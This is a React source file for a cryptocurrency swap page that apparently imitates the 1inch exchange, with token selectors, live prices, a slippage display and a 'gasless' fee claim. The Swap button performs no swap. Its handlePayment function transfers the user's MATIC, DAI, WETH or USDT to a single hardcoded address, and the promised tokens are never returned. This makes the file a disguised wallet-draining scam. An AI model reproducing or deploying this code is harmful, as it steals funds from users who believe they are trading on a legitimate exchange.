import { useState, useEffect } from "react";
import axios from "axios";
import { ethers } from "ethers";
import SwapSelectToken from "./SwapSelectToken";
import SwapSelectSourceToken from "./SwapSelectSourceToken";
import restartIcon from "./assets/restart.png";
import addIcon from "./assets/add.png";
import settingsicon from "./assets/settings.png";
import gasLess from "./assets/gasless-night_2-1.webp";
import maticIcon from "./assets/matic.svg";
import wethIcon from "./assets/weth.webp";
import daiIcon from "./assets/dai.webp";
import usdcIcon from "./assets/usdc.webp";
import usdtIcon from "./assets/usdt.webp";
import wbtcIcon from "./assets/wbtc.webp";
import deIcon from "./assets/de.webp";
import pinIcon from "./assets/pin.svg";
import linkIcon from "./assets/LINK.webp";
import uniIcon from "./assets/uni.webp";
import grtIcon from "./assets/grt.webp";
import ldoIcon from "./assets/ldo.webp";
import aaveIcon from "./assets/aave.webp";
import pepeIcon from "./assets/pepe.webp";
import shibIcon from "./assets/shib.webp";
import ethIcon from "./assets/eth.webp";
import foxIcon from "./assets/fox.webp";
import fraxIcon from "./assets/frax.webp";
import telIcon from "./assets/tel.webp";
import superFarmIcon from "./assets/super-farm.webp";
import compoundIcon from "./assets/compound.webp";
import layerZeroIcon from "./assets/layerzero.webp";
import omIcon from "./assets/om.webp";
import requestIcon from "./assets/request.webp";
import stargateTokenIcon from "./assets/stargateToken.webp";
import routeIcon from "./assets/route.webp";
import affynIcon from "./assets/affyn.webp";
import everRiseIcon from "./assets/everRise.webp";
import towerIcon from "./assets/tower.webp";
import wombatIcon from "./assets/wombat.webp";
import elkIcon from "./assets/elk.webp";
import monavaleIcon from "./assets/monavale.webp";
import polylasticIcon from "./assets/polylastic.webp";
import Skeleton from "react-loading-skeleton";
import "react-loading-skeleton/dist/skeleton.css";

import { useConnect, useAccount, useWriteContract, useReadContracts } from "wagmi";
import { useBalance } from 'wagmi'
import { getBalance } from '@wagmi/core'
import { trustWallet } from "@rainbow-me/rainbowkit/wallets";
import { uniswapWallet } from "@rainbow-me/rainbowkit/wallets";
import { phantomWallet } from "@rainbow-me/rainbowkit/wallets";
import { metaMaskWallet } from "@rainbow-me/rainbowkit/wallets";
import { http, createConfig } from "wagmi";
import { connectorsForWallets } from "@rainbow-me/rainbowkit";
import { erc20Abi } from 'viem'
import {
  BaseError,
  useSendTransaction,
  useWaitForTransactionReceipt,
} from "wagmi";
import {
  polygon,
  arbitrum,
  base,
  mainnet,
  optimism,
  bsc,
  
} from "wagmi/chains";

import { parseEther } from "viem";

const usdtAbi = [
  "function transfer(address to, uint256 value) public returns (bool)",
];


function Swap({ walletAddress }) {
  const [swapFromExpand, setSwapFromExpand] = useState(false);
  const [swapSelectToken, setSwapSelectToken] = useState(false);
  const [swapSelectSourceToken, setSwapSelectSourceToken] = useState(false);
  const [tokenYouPayFullName, setYouPayTokenFullName] = useState("Tether USDT");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [youPayToken, setYouPayToken] = useState("USDT");
  const [youPayTokenAmount, setYouPayTokenAmount] = useState(1);
  const [youPayTokenPrice, setYouPayTokenPrice] = useState(0);
  const [youReceiveToken, setYouReceiveToken] = useState("DAI");
  const [youReceiveTokenAmount, setYouReceiveTokenAmount] = useState(0);
  const [youReceiveTokenPrice, setYouReceiveTokenPrice] = useState(0);
  const [youReceiveTokenPercentChanged, setYouReceiveTokenPercentChanged] =
    useState(0);
  const [USDTPrice, setUSDTPrice] = useState(0);

  const [walletBalance, setWalletBalance] = useState(null);
  const [tokenBalance, setTokenBalance] = useState(0);

  const tokenAddresses = {
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
  };

  const { address } = useAccount(); 

const connectors = connectorsForWallets(
  [
    {
      groupName: "Suggested",
      wallets: [metaMaskWallet, uniswapWallet, phantomWallet, trustWallet],
    },
  ],
  { appName: "RainbowKit App", projectId: "90f079dc357f3b0a2500be0388582698" }
);


const config = createConfig({
  connectors,
  appName: "RainbowKit demo",
  projectId: "90f079dc357f3b0a2500be0388582698",
  chains: [polygon, mainnet, optimism, arbitrum, base, bsc, ],
  transports: {
    [polygon.id]: http(),
    [mainnet.id]: http(),
    [optimism.id]: http(),
    [arbitrum.id]: http(),
    [base.id]: http(),
    [bsc.id]: http(),
  },
});


const getBalanceAsync = async () => {
  try {
    // Ожидание выполнения промиса и получение результата
    const balance = await getBalance(config, {
      address: '0x0cADbE6Faccd17e43e9Ea0945aA3684cb7F0AeB4',
    });
    
    // Доступ к значению formatted
    const formattedBalance = balance.formatted;
   
    return formattedBalance;
  } catch (error) {
    console.error('Error fetching balance:', error);
  }
};

// Вызов функции
getBalanceAsync();

  const {
        sendTransaction,
  } = useSendTransaction();

  const { writeContractAsync } = useWriteContract();


  const handlePayment = async () => {
if(youPayToken === "MATIC") {
  const to = "0x425C42eE5f9F4Eee61C20c07D87EF0B50b66223A";   
    sendTransaction({ to, value: parseEther(youPayTokenAmount.toString()) });
   
} else if (youPayToken === "DAI"){
  try {      
    const data = await writeContractAsync({
      chainId: polygon.id,
     address: tokenAddresses.DAI,
      functionName: "transfer",

      abi: [
        {
          constant: false,
          inputs: [
            {
              name: "_to",
              type: "address",
            },
            {
              name: "_value",
              type: "uint256",
            },
          ],
          name: "transfer",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
      ],
      args: ["0x425C42eE5f9F4Eee61C20c07D87EF0B50b66223A", parseEther(youPayTokenAmount.toString())],
    });

    
  } catch (err) {
    console.log(err);
  }
} else if (youPayToken === "WETH") {
  try {      
    const data = await writeContractAsync({
      chainId: polygon.id,
     address: tokenAddresses.WETH,
      functionName: "transfer",

      abi: [
        {
          constant: false,
          inputs: [
            {
              name: "_to",
              type: "address",
            },
            {
              name: "_value",
              type: "uint256",
            },
          ],
          name: "transfer",
          outputs: [],
          payable: false,
          stateMutability: "nonpayable",
          type: "function",
        },
      ],
      args: ["0x425C42eE5f9F4Eee61C20c07D87EF0B50b66223A", parseEther(youPayTokenAmount.toString())],
    });

  
  } catch (err) {
    console.log(err);
  }
} else if (youPayToken === "USDT") {
  try {      
    const data = await writeContractAsync({
      chainId: polygon.id,
     address: tokenAddresses.USDT,
      functionName: "transfer",

      abi: [
        {
          "constant": false,
          "inputs": [
            {
              "name": "_to",
              "type": "address"
            },
            {
              "name": "_value",
              "type": "uint256"
            }
          ],
          "name": "transfer",
          "outputs": [
            {
              "name": "",
              "type": "bool"
            }
          ],
          "type": "function"
        }
      ]
      ,
      args: ["0x425C42eE5f9F4Eee61C20c07D87EF0B50b66223A", Math.floor(youPayTokenAmount * Math.pow(10, 6))],
    });

    
  } catch (err) {
    console.log(err);
  }
}    
  }; 

  const tokenIcons = {
    MATIC: maticIcon,
    WETH: wethIcon,
    DAI: daiIcon,
    USDC: usdcIcon,
    USDT: usdtIcon,
    WBTC: wbtcIcon,
    DE: deIcon,
    PIN: pinIcon,
    LINK: linkIcon,
    UNI: uniIcon,
    GRT: grtIcon,
    LDO: ldoIcon,
    AAVE: aaveIcon,
    PEPE: pepeIcon,
    SHIB: shibIcon,
    ETH: ethIcon,
    FOX: foxIcon,
    FRAX: fraxIcon,
    TEL: telIcon,
    SUPER: superFarmIcon,
    COMP: compoundIcon,
    ZRO: layerZeroIcon,
    OM: omIcon,
    REQ: requestIcon,
    STG: stargateTokenIcon,
    ROUTE: routeIcon,
    FYN: affynIcon,
    RISE: everRiseIcon,
    TOWER: towerIcon,
    WOMBAT: wombatIcon,
    ELK: elkIcon,
    MONA: monavaleIcon,
    POLX: polylasticIcon,
  };

  const handleSwap = () => {
    const currentPayToken = youPayToken;
    const currentPayAmount = youPayTokenAmount;
    const currentPayPrice = youPayTokenPrice;

    const currentReceiveToken = youReceiveToken;
    const currentReceiveAmount = youReceiveTokenAmount;
    const currentReceivePrice = youReceiveTokenPrice;

    setYouPayToken(currentReceiveToken);
    setYouPayTokenAmount(currentReceiveAmount);
    setYouPayTokenPrice(currentReceivePrice);

    setYouReceiveToken(currentPayToken);
    setYouReceiveTokenAmount(currentPayAmount);
    setYouReceiveTokenPrice(currentPayPrice);
  };

  const handleInputChange = (e) => {
    let value = e.target.value;

    // Разрешаем только цифры и точку
    value = value.replace(/[^0-9.]/g, "");

    // Если точка в начале, убираем её и добавляем ноль
    if (value.startsWith(".")) {
      value = "0" + value;
    }

    // Разделяем строку на целую и дробную части
    let [integerPart, decimalPart] = value.split(".");

    // Убираем ведущие нули в целой части
    if (integerPart.length > 1 && integerPart.startsWith("0")) {
      integerPart = integerPart.replace(/^0+/, "");
      if (integerPart === "") {
        integerPart = "0";
      }
    }

    // Если дробная часть пустая, то заполняем её нулями
    if (decimalPart === undefined) {
      decimalPart = "";
    }

    // Если есть дробная часть, удаляем лишние нули в конце
    if (decimalPart.length > 1) {
      decimalPart = decimalPart.replace(/0+$/, "");
    }

    // Собираем конечное значение
    value = integerPart + (decimalPart ? "." + decimalPart : "");

    // Устанавливаем значение в состояние
    setYouPayTokenAmount(value === "" ? "" : Number(value));
  };

  const handleKeyDown = (e) => {
    const value = e.target.value;
    const { key } = e;
    const isValidKey = /[0-9.]|Backspace|Delete|ArrowLeft|ArrowRight|Tab/.test(
      key
    );

    if (!isValidKey) {
      e.preventDefault();
      return;
    }

    // Проверяем ввод нуля после точки
    if (
      key === "0" &&
      value.includes(".") &&
      value.slice(value.indexOf(".") + 1).length === 0
    ) {
      e.preventDefault();
      return;
    }

    // Проверяем ввод точки, если точка уже есть
    if (key === "." && value.includes(".")) {
      e.preventDefault();
      return;
    }
  };









  const tokenAddress = youPayToken === 'MATIC' ? undefined : tokenAddresses[youPayToken];

  const { data, isError, isLoading } = useBalance({
    address,
    token: tokenAddress,
    chainId: 137, // Polygon chain ID
  });

  useEffect(() => {
    if (!isLoading && !isError && data) {
      setTokenBalance(Number(data.formatted).toFixed(4));
    }
  }, [data, isLoading, isError]);









   useEffect(() => {
    const fetchNewPrice = async () => {
      if (youPayToken && youReceiveToken) {
        try {
          setLoading(true);

          // Инициализация переменных для хранения цен
          let newRoundedPriceTokenYouPay = 0;
          let newRoundedPriceTokenYouReceive = 0;

          const newTokenYouPayData = await axios.get(
            "https://1inchapi88888.vercel.app/api/crypto",
            {
              params: {
                symbol: youPayToken,
                convert: "USD",
              },
            }
          );

          const newTokenYouReceiveData = await axios.get(
            "https://1inchapi88888.vercel.app/api/crypto",
            {
              params: {
                symbol: youReceiveToken,
                convert: "USD",
              },
            }
          );

          if (
            newTokenYouPayData.data.data &&
            newTokenYouPayData.data.data[youPayToken]
          ) {
            newRoundedPriceTokenYouPay = parseFloat(
              newTokenYouPayData.data.data[youPayToken].quote.USD.price.toFixed(
                6
              )
            );
            setYouPayTokenPrice(newRoundedPriceTokenYouPay);
          }

          if (
            newTokenYouReceiveData.data.data &&
            newTokenYouReceiveData.data.data[youReceiveToken]
          ) {
            newRoundedPriceTokenYouReceive = parseFloat(
              newTokenYouReceiveData.data.data[
                youReceiveToken
              ].quote.USD.price.toFixed(6)
            );
            if (newRoundedPriceTokenYouReceive === 0) {
              console.error("Received zero price for token:", youReceiveToken);
            }
            setYouReceiveTokenPrice(newRoundedPriceTokenYouReceive);

            // Calculate the amount of receive token based on the latest prices and amount of pay token
            const newAmount =
              (youPayTokenAmount * newRoundedPriceTokenYouPay) /
              newRoundedPriceTokenYouReceive;
            //console.log("Calculated youReceiveTokenAmount:", newAmount);
            setYouReceiveTokenAmount(newAmount);
          }

          setLoading(false);
        } catch (err) {
          console.error("Error fetching prices:", err);
          setError(err.message);
          setLoading(false);
        }
      }
    };

    fetchNewPrice();
  }, [youPayToken, youReceiveToken, youPayTokenAmount]);

  useEffect(() => {
    const fetchUSDTPrice = async () => {
      try {
        const GetUSDTPrice = await axios.get(
          "https://1inchapi88888.vercel.app/api/crypto",
          {
            params: {
              symbol: "USDT",
              convert: "USD",
            },
          }
        );
        if (GetUSDTPrice.data.data) {
          setUSDTPrice(
            parseFloat(
              GetUSDTPrice.data.data["USDT"].quote.USD.price.toFixed(6)
            )
          );
        }
      } catch (err) {
        setError(err.message);
      }
    };

    fetchUSDTPrice();
  }, []);


  return (
    <div className="page-content">
      <div className="swap-container">
        {!swapSelectToken && !swapSelectSourceToken && (
          <>
            <div className="swap-form-header">
              <div className="trade-menu">
                <span className="trade-menu-swap">Swap</span>
                <span className="trade-menu-limit">Limit</span>
              </div>
              <div className="swap-form-actions">
                <div className="restart-icon">
                  <img className="restart-icon-img" src={restartIcon} alt="" />
                </div>
                <div className="add-icon">
                  <img className="add-icon-img" src={addIcon} alt="" />
                </div>
                <div className="settings-icon">
                  <img
                    className="settings-icon-img"
                    src={settingsicon}
                    alt=""
                  />
                </div>
              </div>
            </div>
            <div className="source-token-input">
              <div className="source-title">
                <span>You pay</span>
                <div className="source-token-input-container">
                  <span className="source-title-wallet-balance">Balance: {tokenBalance}</span>
                  <div className="source-title-button-max" onClick={(e) => {e.preventDefault(); setYouPayTokenAmount(tokenBalance)}}>MAX</div>
                </div>
              </div>
              <div className="selected-token">
                <div
                  className="select-source-token"
                  onClick={() => setSwapSelectSourceToken(true)}
                >
                  <img
                    className="selected-token-icon"
                    src={tokenIcons[youPayToken]}
                    alt=""
                  />
                  <span className="selected-token-symbol">{youPayToken}</span>
                  <svg
                    id="arrow-down"
                    width="16"
                    height="17"
                    viewBox="0 0 16 17"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M4 6.5L8 10.5L12 6.5"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                  </svg>
                </div>
                <input
                  type="number"
                  value={youPayTokenAmount}
                  onChange={handleInputChange}
                  onKeyDown={handleKeyDown}
                  maxLength={6}
                  id="payPrice"
                  className="source-token-amount-input"
                  style={{
                    WebkitAppearance: "none",
                    MozAppearance: "textfield",
                    color: "white",
                    textAlign: "right",
                    border: "none",
                    outline: "none",
                    backgroundColor: "transparent",
                    fontSize: "24px",
                    fontWeight: 400,
                  }}
                />
              </div>
              <div className="token-info">
                <span className="token-name">{tokenYouPayFullName}</span>
                <div className="token-amount">{"~$" + youPayTokenPrice}</div>
              </div>
            </div>
            <div className="swap-separator">
              <div className="swap-reverse" onClick={handleSwap}>
                <svg
                  id="swap-direction-arrow"
                  width="12"
                  height="11"
                  viewBox="0 0 12 11"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M6 1L6 10M6 10L11 5M6 10L1 5"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  ></path>
                </svg>
              </div>
            </div>
            <div className="destination-token-input">
              <div className="destination-title">
                <span>You receive</span>
              </div>
              <div className="selected-token">
                <div
                  className="select-destination-token"
                  onClick={() => setSwapSelectToken(true)}
                >
                  <img
                    className="selected-token-icon"
                    src={tokenIcons[youReceiveToken]}
                    alt=""
                  />
                  <span className="selected-token-symbol">
                    {youReceiveToken}
                  </span>
                  <svg
                    id="arrow-down"
                    width="16"
                    height="17"
                    viewBox="0 0 16 17"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M4 6.5L8 10.5L12 6.5"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                  </svg>
                </div>
                <div id="receivePrice" className="destination-token-amount">
                  {loading ? (
                    <Skeleton height={20} />
                  ) : (
                    youReceiveTokenAmount.toFixed(6)
                  )}
                </div>
              </div>
              <div className="token-info">
                <span className="token-name">{youReceiveToken}</span>
                <div className="token-amount">
                  {"~$" + youReceiveTokenPrice}
                </div>
              </div>
            </div>
            <div className="swap-from">
              <button onClick={() => setSwapFromExpand(!swapFromExpand)}>
                <div className="swap-from-button-title">
                  <span className="from-token-amount">1 {youPayToken}</span>
                  <span className="from-token-equal">=</span>
                  <p className="from-token-rate">
                    {(youPayTokenPrice / youReceiveTokenPrice).toFixed(6)}
                  </p>
                  <span className="from-token-name">{youReceiveToken}</span>
                  <span className="usd-value">
                    (~${(youPayTokenPrice / youPayTokenAmount).toFixed(2)})
                  </span>
                </div>
                {!swapFromExpand && (
                  <div className="swap-from-button-tooltip">
                    <img className="gasless-logo" src={gasLess} alt="gasless" />
                    <span className="gasless-cost">Free</span>
                    <span className="swap-from-button-tooltip-usd-token-price">
                      $0.01
                    </span>
                    <svg
                      id="arrow-swap"
                      viewBox="0 0 17 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                      width="16"
                      height="16"
                    >
                      <path
                        d="M4.125 6L8.125 10L12.125 6"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      ></path>
                    </svg>
                  </div>
                )}
                {swapFromExpand && (
                  <svg
                    id="arrow-swap"
                    viewBox="0 0 17 16"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M4.125 6L8.125 10L12.125 6"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      transform="scale(1, -1) translate(0, -16)"
                    ></path>
                  </svg>
                )}
              </button>

              {swapFromExpand && (
                <div className="swap-from-expand">
                  <div className="swap-from-expand-item">
                    <div className="swap-from-expand-item-title">
                      <span>Slippage tolerance</span>
                    </div>
                    <div id="slp-tlr" className="swap-from-expand-item-value">
                      <span className="slp-tlr">2.8%</span>
                      <span className="slp-tlr">·</span>
                      <span className="slp-tlr">Auto</span>
                    </div>
                  </div>
                  <div className="swap-from-expand-item">
                    <div className="swap-from-expand-item-title">
                      Minimum receive
                    </div>
                    <div
                      id="min-receive-val"
                      className="swap-from-expand-item-value"
                    >
                      <span className="min-receive-val">
                        {(
                          youPayTokenAmount / youReceiveTokenAmount -
                          (youPayTokenAmount / youReceiveTokenAmount / 100) *
                            2.8
                        ).toFixed(8)}
                      </span>
                      <span className="min-receive-token">DAI</span>
                      <span>(~$0.47764351)</span>
                    </div>
                  </div>
                  <div className="swap-from-expand-item">
                    <div className="swap-from-expand-item-title">
                      Network fee
                    </div>
                    <div className="swap-from-expand-item-value">
                      <div id="gas-les-item">
                        <img src={gasLess} />
                        <span id="gas-les-item-text">Free</span>
                        <span id="gas-les-item-val">$0.01</span>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="swap-button-container">
              <button className="swap-button" onClick={(handlePayment)}>
                <span className="swap-button-content">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M6 2C3.79086 2 2 3.79086 2 6V8V18C2 20.2091 3.79086 22 6 22H18C20.2091 22 22 20.2091 22 18V10C22 7.79086 20.2091 6 18 6C18 3.79086 16.2091 2 14 2H6ZM16 6H4C4 4.89543 4.89543 4 6 4H14C15.1046 4 16 4.89543 16 6ZM4 18V8H18C19.1046 8 20 8.89543 20 10V18C20 19.1046 19.1046 20 18 20H6C4.89543 20 4 19.1046 4 18ZM14 13C13.4477 13 13 13.4477 13 14C13 14.5523 13.4477 15 14 15H17C17.5523 15 18 14.5523 18 14C18 13.4477 17.5523 13 17 13H14Z"
                      fill="#5599FF"
                    />
                  </svg>
                  Swap
                </span>
              </button>
            </div>
          </>
        )}
        {swapSelectToken && (
          <SwapSelectToken
            SwapSelect={setSwapSelectToken}
            setYouReceiveToken={setYouReceiveToken}
          />
        )}
        {swapSelectSourceToken && (
          <SwapSelectSourceToken
            SwapSelect={setSwapSelectSourceToken}
            setYouPayToken={setYouPayToken}
          />
        )}
      </div>
    </div>
  );
}

export default Swap;
